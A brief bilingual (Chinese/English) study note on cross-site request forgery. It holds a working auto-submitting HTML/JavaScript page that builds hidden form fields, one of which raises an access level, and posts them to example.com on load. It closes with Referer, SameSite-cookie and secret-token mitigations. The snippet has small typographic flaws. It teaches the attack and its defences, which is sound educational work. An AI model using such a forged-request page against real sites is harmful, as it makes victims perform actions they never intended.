# CSRF

Cross-site Request Forgery(CSRF).

- GET：img的src标签可以达成

- POST：javascript构造

  ```javascript
  <html>
  <body>
  <h1>This page forges an HTTP POST request.</h1>
  <script type="text/javascript">
  function forge_post()
  {
      var fields;
      // The following are form entries need to be filled out by attackers.
      // The entries are made hidden, so the victim won’t be able to see them.
      fields += "<input type=’hidden’ name=’name’ value=’****’>";
      fields += "<input type=’hidden’ name=’briefdescription’ value=’****’>";
      fields += "<input type=’hidden’ name=’accesslevel[briefdescription]’
      value=’2’>"; ➀
      fields += "<input type=’hidden’ name=’guid’ value=’****’>";
      // Create a <form> element.
      var p = document.createElement("form");
      // Construct the form
      p.action = "http://www.example.com";
      p.innerHTML = fields;
      p.method = "post";
      // Append the form to the current page.
      document.body.appendChild(p);
      // Submit the form
      p.submit();
  }
  // Invoke forge_post() after the page is loaded.
  window.onload = function() { forge_post();}
  </script>
  </body>
  </html>
  ```

## Mitigation

- referer头：浏览器为保护隐私可能关闭
- 同站cookie：区别cookie能否跨站使用
- secret token：附加在表单或请求中，以进行验证。